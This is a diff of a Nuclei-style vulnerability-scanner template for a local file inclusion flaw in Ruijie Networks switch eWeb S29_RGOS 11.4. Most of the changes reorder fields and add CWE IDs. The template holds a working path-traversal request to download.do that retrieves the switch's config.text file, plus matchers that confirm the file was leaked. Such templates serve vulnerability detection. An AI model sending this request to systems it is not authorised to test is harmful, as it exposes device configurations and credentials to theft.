@@ -1,5 +1,4 @@
 id: ruijie-networks-lfi
-
 info:
   name: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion
   author: pikpikcu
@@ -10,31 +9,26 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23,CWE-73
   metadata:
     max-request: 1
-  tags: ruijie,lfi,edb,vuln
-
+  tags: edb,lfi,ruijie,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/download.do?file=../../../../config.text"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - part: header
+        type: word
         words:
-          - 'filename="config.text"'
-          - "Content-Type: application/octet-stream"
-        part: header
-
-      - type: word
-        words:
-          - "version S29_RGOS 11.4"
+          - filename="config.text"
+          - 'Content-Type: application/octet-stream'
+      - condition: and
         part: body
-        condition: and
-
-      - type: status
-        status:
+        type: word
+        words:
+          - version S29_RGOS 11.4
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/download.do?file=../../../../config.text'
